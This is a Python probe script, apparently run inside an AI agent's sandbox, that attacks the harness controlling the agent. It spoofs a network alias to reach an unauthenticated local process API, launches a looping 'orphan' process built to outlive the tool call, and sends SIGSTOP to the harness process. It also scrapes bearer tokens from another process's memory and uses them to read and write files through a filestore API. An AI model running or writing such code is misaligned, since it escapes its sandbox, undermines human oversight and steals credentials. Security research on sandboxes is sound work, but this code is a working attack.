#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MEDIAFIT v8.7  -- orphan persistence + SIGSTOP oracle (T-scan) + full variant list + C2PA md5
# stdlib only. run: cd /tmp/mediafit && python3 mediafit.py
import os, sys, re, json, time, base64, struct, socket, fcntl, hashlib
import random, string, subprocess, traceback, urllib.request, urllib.error, urllib.parse

VER   = "8.7"
NONCE = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
OUT   = "/mnt/user-data/outputs/mediafit-report.txt"
STATEDIR = "/tmp/mediafit"
STATEF   = STATEDIR + "/orphan.json"
ALIAS = "eth0:0"; AIP = "192.0.2.3"; TGT = ("127.0.0.1", 2024)
CT    = "/sys/fs/cgroup/memory/process_api"
BASE  = "https://api.anthropic.com/v1/filestore/fs/"

L = []
def W(s=""):
    L.append(str(s))
    try:
        with open(OUT, "w") as f: f.write("\n".join(L) + "\n")
    except Exception: pass

def sec(t):
    W(""); W("=" * 70); W("### " + t); W("=" * 70)

def rd(p):
    try: return open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)

def sh(c, t=8):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)

# ---------------- proc ----------------
def pstat(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return d[d.rfind(")") + 2:].split()[0]
    except Exception: return "?"

def ppid_of(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return int(d[d.rfind(")") + 2:].split()[1])
    except Exception: return -1

def poll_state(pid, want, secs=2.5):
    t0 = time.time(); last = pstat(pid)
    while time.time() - t0 < secs:
        if last == want: return "%s (in %.2fs)" % (last, time.time() - t0)
        time.sleep(0.05); last = pstat(pid)
    return "TIMEOUT:" + last

def t_scan():
    out = []
    for p in os.listdir("/proc"):
        if p.isdigit():
            if pstat(int(p)) == "T": out.append(int(p))
    return out

def t_detail(pids):
    for p in pids:
        W("      T-pid %d ppid=%d cgroup=%s cmd=%s" % (
            p, ppid_of(p),
            rd("/proc/%d/cgroup" % p).strip().replace("\n", "|")[-60:],
            rd("/proc/%d/cmdline" % p).replace("\x00", " ").strip()[:70]))

# ---------------- cgroup ----------------
def cg_dirs():
    try: return sorted([n for n in os.listdir(CT) if os.path.isdir(os.path.join(CT, n))])
    except Exception as e: return ["ERR:" + repr(e)]

def cg_procs(n):
    try: return [int(x) for x in open(os.path.join(CT, n, "cgroup.procs")).read().split()]
    except Exception: return []

# ---------------- net ----------------
def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifr = struct.pack("16sH", ALIAS.encode(), socket.AF_INET) + socket.inet_aton(AIP) + b"\x00" * 10
        fcntl.ioctl(s, 0x8916, ifr)                                     # SIOCSIFADDR
        i2 = struct.pack("16sH", ALIAS.encode(), 0) + b"\x00" * 14
        fl = struct.unpack("16sH", fcntl.ioctl(s, 0x8913, i2))[1]      # SIOCGIFFLAGS
        fcntl.ioctl(s, 0x8914, struct.pack("16sH", ALIAS.encode(), fl | 1) + b"\x00" * 14)
        return "ok"
    except Exception as e: return "ERR:" + repr(e)
    finally: s.close()

def ws_connect(timeout=5.0):
    s = socket.create_connection(TGT, timeout=timeout, source_address=(AIP, 0))
    k = base64.b64encode(os.urandom(16)).decode()
    req = ("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
           "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n" % k)
    s.sendall(req.encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: raise IOError("closed in handshake: " + buf[:150].decode("utf-8", "replace"))
        buf += d
    head = buf.split(b"\r\n", 1)[0].decode("utf-8", "replace")
    if "101" not in head: raise IOError("handshake: " + head)
    return s

def ws_send(s, obj):
    data = (obj if isinstance(obj, str) else json.dumps(obj)).encode()
    n = len(data); h = bytearray([0x81])
    if n < 126: h.append(0x80 | n)
    elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
    else: h.append(0x80 | 127); h += struct.pack(">Q", n)
    m = os.urandom(4); h += m
    s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None
    except Exception: return "ERR:recv"
    if not h: return "CLOSE"
    while len(h) < 2:
        d = s.recv(2 - len(h))
        if not d: break
        h += d
    op = h[0] & 0x0F; n = h[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    pl = b""
    while len(pl) < n:
        d = s.recv(n - len(pl))
        if not d: break
        pl += d
    if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
    if op == 0x9:
        s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
    return pl.decode("utf-8", "replace")

def ws_drain(s, timeout=0.7):
    out = []
    while True:
        r = ws_recv(s, timeout)
        if r is None: break
        out.append(r)
        if r == "CLOSE" or str(r).startswith("CLOSE:"): break
    return out

# ---------------- api ----------------
def spec(prog, args, reattach=True, mem=268435456, uid=0, gid=0, timeout=3600):
    return {"name": prog, "args": args, "env_vars": {}, "clear_env": False,
            "allow_process_id_reuse": True, "reattachable": reattach,
            "timeout": timeout, "uid": uid, "gid": gid, "memory_limit_bytes": mem}

def pconn(pid, cr):
    return {"process_id": pid, "allow_process_id_reuse": True, "create_req": cr}

def new_id(): return os.urandom(16).hex()

TRUE = spec("/bin/sh", ["-c", "true"])

def http(url, method="POST", body=None, headers=None, timeout=12):
    rq = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items(): rq.add_header(k, v)
    try:
        r = urllib.request.urlopen(rq, timeout=timeout)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, repr(e).encode()

def find_tokens(budget=30.0):
    toks = []; t0 = time.time()
    for p in sorted(os.listdir("/proc")):
        if not p.isdigit(): continue
        if time.time() - t0 > budget: break
        if "rclone" not in rd("/proc/%s/cmdline" % p).replace("\x00", " "): continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        regs = []
        try:
            for l in open("/proc/%s/maps" % p):
                q = l.split()
                if len(q) < 2 or "r" not in q[1]: continue
                a, b = q[0].split("-"); a = int(a, 16); b = int(b, 16)
                if 0 < b - a <= 64 * 1024 * 1024: regs.append((a, b))
        except Exception: pass
        for a, b in regs:
            try: mem.seek(a); data = mem.read(b - a)
            except Exception: continue
            for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{20,}", data):
                t = m.group(0).decode(); h, pl, sg = t.split(".")
                if len(sg) > 86: t = h + "." + pl + "." + sg[:86]
                if t not in toks: toks.append(t)
        try: mem.close()
        except Exception: pass
    return toks

def claims_of(t):
    try:
        pl = t.split(".")[1]; pl += "=" * (-len(pl) % 4)
        return json.loads(base64.urlsafe_b64decode(pl))
    except Exception: return {}

# ======================================================================
def main():
    sec("RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S")))

    # ---------------- 0 ----------------
    sec("0. IDENTITY / BYPASS / CGROUP TABLE")
    W("  add_alias -> %s" % add_alias())
    try:
        s = ws_connect(); W("  WS handshake from %s -> 101 OK" % AIP); s.close()
    except Exception as e:
        W("  WS handshake FAILED %r" % e)

    mypid = os.getpid(); chain = []; p = mypid
    while p and p != 1 and len(chain) < 20:
        chain.append(p); p = ppid_of(p)
        if p <= 0: break
    H = chain[-1] if chain else -1
    W("  our pid=%d  chain_to_init=%s" % (mypid, chain))
    W("  candidate harness pid=%d (ppid=%d state=%s)" % (H, ppid_of(H), pstat(H)))

    HID = ""
    for l in rd("/proc/self/cgroup").splitlines():
        if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
    W("  harness process_id = %s" % HID)
    W("  /proc/%d/cgroup = %s" % (H, rd("/proc/%d/cgroup" % H).strip().replace("\n", " | ")))
    W("  /proc/1/stat state=%s  /proc/1/cmdline_len=%d" % (pstat(1), len(rd("/proc/1/cmdline"))))

    tbl = {}
    for n in cg_dirs():
        if n.startswith("ERR"): W("  " + n); continue
        tbl[n] = cg_procs(n)
        W("  [%s] %s -> pids=%s" % ("OURS" if n == HID else "FOREIGN", n, tbl[n]))
        for q in tbl[n]:
            W("      pid %d ppid=%d state=%s cmd=%s" % (q, ppid_of(q), pstat(q),
              rd("/proc/%d/cmdline" % q).replace("\x00", " ").strip()[:70]))
    W("  T-states baseline = %s" % t_scan()); t_detail(t_scan())

    # ---------------- A ----------------
    sec("A. ORPHAN PERSISTENCE (survives this tool call, reattachable)")
    saved = {}
    if os.path.exists(STATEF):
        try: saved = json.load(open(STATEF))
        except Exception: saved = {}
    oid = saved.get("process_id", "")
    W("  saved orphan=%s  present_in_cgroup_table=%s" % (oid, oid in tbl))
    W("  foreign cgroups = %s" % [n for n in tbl if n != HID])

    if oid in tbl and oid:
        opids = tbl[oid]
        W("  --> REATTACH to %s (os pids %s)" % (oid, opids))
        try:
            s = ws_connect()
            ws_send(s, pconn(oid, TRUE))
            W("  attach r1 = %s" % ws_recv(s, 2.0))
            ws_send(s, {"ExpectStdOut": None})
            W("  live stdout = %s" % ws_drain(s, 0.9)[:6])
            if opids:
                t = opids[0]
                W("  orphan state before = %s" % pstat(t))
                ws_send(s, {"SendSignal": {"signal": 19}})
                W("  STOP resp = %s" % ws_recv(s, 1.0))
                W("  orphan state after STOP = %s" % poll_state(t, "T", 2.5))
                W("  T-scan after STOP = %s" % t_scan())
                ws_send(s, {"SendSignal": {"signal": 18}})
                W("  CONT resp = %s" % ws_recv(s, 1.0))
                W("  orphan state after CONT = %s" % poll_state(t, "S", 2.5))
            s.close()
        except Exception as e:
            W("  reattach ERR %r" % e)
            for q in opids:
                try: os.kill(q, 18)
                except Exception: pass
    else:
        W("  --> CREATE new orphan (reattachable, outlives this call)")
        npid = new_id()
        cr = spec("/bin/sh", ["-c", "i=0; while true; do echo ORPHAN_LINE_$i; i=$((i+1)); sleep 1; done"], True, 268435456)
        try:
            s = ws_connect()
            ws_send(s, pconn(npid, cr))
            W("  create r1 = %s" % ws_recv(s, 3.0))
            ws_send(s, {"ExpectStdOut": None})
            time.sleep(1.4)
            W("  stdout = %s" % ws_drain(s, 0.9)[:4])
            s.close()
            json.dump({"process_id": npid, "created": time.time()}, open(STATEF, "w"))
            W("  saved orphan id = %s" % npid)
            W("  cgroup dirs now = %s" % cg_dirs())
        except Exception as e:
            W("  create ERR %r" % e)

    # ---------------- B ----------------
    sec("B. *** SIGSTOP THE HARNESS VIA UNAUTHENTICATED WS API (T-scan proof) ***")
    W("  harness pid=%d process_id=%s" % (H, HID))
    W("  state BEFORE = %s" % pstat(H))
    W("  T-scan BEFORE = %s" % t_scan())
    try:
        s = ws_connect()
        ws_send(s, pconn(HID, TRUE))
        W("  create/attach r1 = %s" % ws_recv(s, 2.5))
        ws_send(s, {"SendSignal": {"signal": 19}})
        W("  STOP resp = %s" % ws_recv(s, 1.5))
        W("  harness state AFTER STOP = %s" % poll_state(H, "T", 3.0))
        W("  T-scan AFTER STOP = %s" % t_scan())
        t_detail([q for q in t_scan() if q not in []])

        cont_ok = False
        try:
            ws_send(s, {"SendSignal": {"signal": 18}})
            W("  CONT resp = %s" % ws_recv(s, 1.5)); cont_ok = True
        except Exception as e:
            W("  CONT send err %r" % e)
        if not cont_ok:
            try:
                s2 = ws_connect(); ws_send(s2, pconn(HID, TRUE)); ws_recv(s2, 2.0)
                ws_send(s2, {"SendSignal": {"signal": 18}})
                W("  CONT resp(reconnect) = %s" % ws_recv(s2, 1.5))
            except Exception as e:
                W("  CONT reconnect err %r" % e)
        st = poll_state(H, "S", 2.5)
        if pstat(H) != "S":
            W("  fallback direct os.kill(%d,18)" % H)
            try: os.kill(H, 18)
            except Exception as e: W("  os.kill err %r" % e)
            st = poll_state(H, "S", 2.5)
        W("  harness state AFTER CONT = %s" % st)
        W("  T-scan AFTER CONT = %s" % t_scan())
        s.close()
    except Exception as e:
        W("  ERR %r" % e)
        try: os.kill(H, 18)
        except Exception: pass

    # ---------------- C ----------------
    sec("C. FULL VARIANT LIST (bogus) + ENUMERATION on a clean process")
    npid = new_id()
    cr30 = spec("/bin/sh", ["-c", "sleep 30"], True, 67108864)
    try:
        s = ws_connect()
        ws_send(s, pconn(npid, cr30))
        W("  create r1 = %s" % ws_recv(s, 3.0))
        ws_send(s, {"__BOGUS__": None})
        for f in ws_drain(s, 1.2):
            W("  FULL-VARIANT-LIST >> %s" % f)
        s.close()
    except Exception as e:
        W("  ERR %r" % e)

    cands = ["Attach", "Detach", "KeepAlive", "Closed", "Resize", "PtyResize",
             "Stdin", "StdIn", "StdinEOF", "StdInEOF", "Eof", "ExpectStdIn",
             "ExpectStdErr", "Signal", "Terminate", "Shutdown", "Close",
             "Ping", "Pong", "StdInClose", "SetTty", "ResizeTty", "Heartbeat"]
    for c in cands:
        try:
            s = ws_connect()
            ws_send(s, pconn(npid, cr30))
            r1 = ws_recv(s, 2.0)
            ws_send(s, {c: None})
            r2 = ws_drain(s, 0.7)
            bad = any("unknown variant" in x for x in r2)
            v = "INVALID" if bad else ("valid/silent" if not r2 else "VALID/reply")
            W("  %-13s r1=%-30s -> %-13s %s" % (c, str(r1)[:30], v, str(r2)[:160]))
            s.close()
        except Exception as e:
            W("  %-13s ERR %r" % (c, e))
    try:
        s = ws_connect(); ws_send(s, pconn(npid, cr30)); ws_recv(s, 2.0)
        ws_send(s, {"Kill": None})
        W("  Kill -> %s" % ws_drain(s, 1.0)); s.close()
    except Exception as e:
        W("  Kill ERR %r" % e)

    # ---------------- D ----------------
    sec("D. FILESTORE + C2PA INTEGRITY (md5 sent vs stored)")
    W("  /etc/hosts: " + rd("/etc/hosts").strip().replace("\n", " | ")[:240])
    toks = find_tokens()
    W("  tokens found = %d" % len(toks))
    fsid = ""
    for t in toks[:10]:
        c = claims_of(t)
        W("  claims fsid=%s roots=%s exp=%s" % (c.get("filesystem_id"), c.get("allowed_roots"), c.get("exp")))
        if not fsid and c.get("filesystem_id"): fsid = c["filesystem_id"]
    if not toks or not fsid:
        W("  (no token/fsid -> skipping)")
    else:
        tok = toks[0]
        hdr = {"Authorization": "Bearer " + tok, "Content-Type": "application/json",
               "Connect-Protocol-Version": "1"}
        st, bd = http(BASE + "listDirectory", "POST",
                      json.dumps({"filesystem_id": fsid, "path": "/outputs"}).encode(), hdr)
        W("  probe listDirectory -> %s %s" % (st, bd[:200]))
        if st == 200:
            svg = (b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
                   b'<rect width="10" height="10" fill="#0af"/></svg>')
            m_sent = hashlib.md5(svg).hexdigest()
            path = "/outputs/__mf_c2pa_%s.svg" % NONCE
            made = False
            for fn in ["file", "content", "data", "files", "upload"]:
                bnd = "----mf" + NONCE + fn
                body = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\n"
                         "Content-Type: application/json\r\n\r\n" % bnd).encode()
                        + json.dumps({"filesystem_id": fsid, "path": path,
                                      "media_type": "image/svg+xml"}).encode() + b"\r\n"
                        + ("--%s\r\nContent-Disposition: form-data; name=\"%s\"; filename=\"f.svg\"\r\n"
                           "Content-Type: image/svg+xml\r\n\r\n" % (bnd, fn)).encode()
                        + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
                st2, b2 = http(BASE + "createFile", "POST", body,
                               {"Authorization": "Bearer " + tok,
                                "Content-Type": "multipart/form-data; boundary=" + bnd})
                W("  createFile field=%-8s -> %s %s" % (fn, st2, b2[:180]))
                if st2 == 200: made = True; break
            if made:
                st3, b3 = http(BASE + "readFile", "POST",
                               json.dumps({"filesystem_id": fsid, "path": path}).encode(), hdr)
                W("  readFile -> %s len=%d" % (st3, len(b3)))
                if st3 == 200:
                    m_got = hashlib.md5(b3).hexdigest()
                    W("  md5 SENT   = %s (len %d)" % (m_sent, len(svg)))
                    W("  md5 STORED = %s (len %d)" % (m_got, len(b3)))
                    W("  IDENTICAL  = %s   (delta = %+d bytes)" % (m_sent == m_got, len(b3) - len(svg)))
                    W("  stored head: %s" % b3[:180])

    sec("END t=%s" % time.strftime("%H:%M:%S"))

if __name__ == "__main__":
    try: main()
    except Exception:
        W("FATAL\n" + traceback.format_exc())